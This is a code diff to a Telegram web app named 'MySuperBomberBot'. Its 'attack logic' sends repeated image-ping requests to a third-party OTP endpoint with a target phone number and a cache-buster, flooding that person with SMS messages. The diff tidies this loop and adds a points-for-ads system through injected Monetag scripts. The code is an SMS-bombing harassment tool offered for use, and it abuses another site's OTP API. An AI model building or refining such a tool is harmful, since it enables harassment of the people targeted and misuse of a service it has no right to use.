@@ -298,7 +298,7 @@
                 </div>
             </div>
 
-            <button class="btn btn-primary" onclick="saveSettings()">SAVE ALL DATA</button>
+            <button class="btn btn-primary" onclick="saveSettings()">SAVE SETTINGS</button>
         </div>
 
         <div class="version-text" id="secretTrigger">Version 2.0.1 Stable Build</div>
@@ -327,7 +327,7 @@
         const INITIAL_CONFIG = {
             adminIds: ["8472008662", "8428347588"],
             botUsername: "MySuperBomberBot",
-            smsApi: "https://api.karigoripathsala.com/api/get-otp?phone={phone}", // Default set to your API
+            smsApi: "https://api.karigoripathsala.com/api/get-otp?phone={phone}",
             cost: 10,
             refRew: 100,
             dailyAmt: 50,
@@ -338,8 +338,8 @@
 
         const INITIAL_USER = { points: 0, completedTasks: [], lastDaily: 0 };
 
-        let config = JSON.parse(localStorage.getItem('sh_cfg_v14')) || INITIAL_CONFIG;
-        let userData = JSON.parse(localStorage.getItem('sh_usr_v14')) || INITIAL_USER;
+        let config = JSON.parse(localStorage.getItem('sh_cfg_v15')) || INITIAL_CONFIG;
+        let userData = JSON.parse(localStorage.getItem('sh_usr_v15')) || INITIAL_USER;
 
         let tg = window.Telegram.WebApp;
         let user = tg.initDataUnsafe?.user || { id: "000000", first_name: "Guest" };
@@ -351,8 +351,8 @@
         };
 
         function syncAll() {
-            localStorage.setItem('sh_cfg_v14', JSON.stringify(config));
-            localStorage.setItem('sh_usr_v14', JSON.stringify(userData));
+            localStorage.setItem('sh_cfg_v15', JSON.stringify(config));
+            localStorage.setItem('sh_usr_v15', JSON.stringify(userData));
 
             document.getElementById('userPoints').innerText = userData.points;
             document.getElementById('rateDisplay').innerText = config.cost;
@@ -367,19 +367,58 @@
             calcCost();
         }
 
+        // --- FIXED MONETAG LOGIC ---
+        let currentZoneId = null;
         function injectMonetag() {
             if(!config.monetagCode) return;
-            const div = document.createElement('div');
-            div.innerHTML = config.monetagCode;
-            const scriptTag = div.querySelector('script');
-            if(scriptTag) {
-                const s = document.createElement('script');
-                Array.from(scriptTag.attributes).forEach(attr => s.setAttribute(attr.name, attr.value));
-                document.head.appendChild(s);
+            
+            // Extract Zone ID from raw script string
+            const zoneMatch = config.monetagCode.match(/data-zone=["'](\d+)["']/);
+            if (!zoneMatch) return;
+            currentZoneId = zoneMatch[1];
+
+            // Only inject if not already exists
+            if (document.getElementById(`monetag-sdk-${currentZoneId}`)) return;
+
+            const s = document.createElement('script');
+            s.id = `monetag-sdk-${currentZoneId}`;
+            s.src = "https://libtl.com/sdk.js";
+            s.setAttribute('data-zone', currentZoneId);
+            s.setAttribute('data-sdk', `show_${currentZoneId}`);
+            s.async = true;
+            document.head.appendChild(s);
+            console.log("Ad System Injected for Zone:", currentZoneId);
+        }
+
+        function watchAd() {
+            if (!currentZoneId) return tg.showAlert("Ad System not configured by Admin.");
+            
+            const functionName = `show_${currentZoneId}`;
+            
+            if (typeof window[functionName] === 'function') {
+                const btn = document.querySelector('.ad-card .btn');
+                const originalText = btn.innerText;
+                btn.innerText = "Loading Ad...";
+                btn.disabled = true;
+
+                // Monetag promise-based show function
+                window[functionName]().then(() => {
+                    userData.points += parseInt(config.adRew);
+                    syncAll();
+                    tg.showAlert(`✅ Success! You earned ${config.adRew} Pts.`);
+                }).catch((e) => {
+                    console.error("Ad error:", e);
+                    tg.showAlert("Ad was skipped or failed. No reward granted.");
+                }).finally(() => {
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                });
+            } else {
+                tg.showAlert("Ad is still loading or blocked. Please try again in 5 seconds.");
             }
         }
 
-        // --- PERFECTLY SYNCED ATTACK LOGIC FOR YOUR API ---
+        // --- ATTACK LOGIC (KARIGORIPATHSALA SYNCED) ---
         let bombing = false;
         async function startAttack() {
             const num = document.getElementById('targetNum').value;
@@ -400,33 +439,20 @@
             document.getElementById('statusText').innerText = "Connecting to API...";
             document.getElementById('progressBar').style.width = "0%";
             
-            let finalUrlTemplate = config.smsApi;
-            
-            // Loop through each SMS request
             for(let i=0; i<amt; i++) {
                 if(!bombing) break;
-                
-                // Replace {phone} and add a cache buster to ensure it hits server every time
-                const api = finalUrlTemplate.replace('{phone}', num) + "&cb=" + i + "_" + Date.now();
-                
-                // Real hit using Image ping method (Most reliable for these APIs)
+                const api = config.smsApi.replace('{phone}', num) + "&cb=" + Date.now();
                 const img = new Image();
                 img.src = api;
                 
                 let currentCount = i + 1;
                 let percentage = (currentCount / amt) * 100;
-                
-                // UI updates in real-time
                 document.getElementById('progressBar').style.width = percentage + "%";
-                document.getElementById('statusText').innerText = `Blasting: ${currentCount}/${amt} SMS`;
-                
-                // Wait for the API processing time (approx 0.8s - 1.2s delay for stability)
+                document.getElementById('statusText').innerText = `Sending: ${currentCount}/${amt} SMS`;
                 await new Promise(r => setTimeout(r, 1000));
             }
             
-            if(bombing) {
-                document.getElementById('statusText').innerText = `Completed: ${amt} SMS Sent!`;
-            }
+            if(bombing) document.getElementById('statusText').innerText = `Completed!`;
             stopAttack();
         }
 
@@ -436,7 +462,7 @@
             document.getElementById('stopBtn').style.display = 'none';
         }
 
-        // UTILS
+        // --- UTILS ---
         function renderTasks() {
             const list = document.getElementById('taskListContainer');
             list.innerHTML = '';
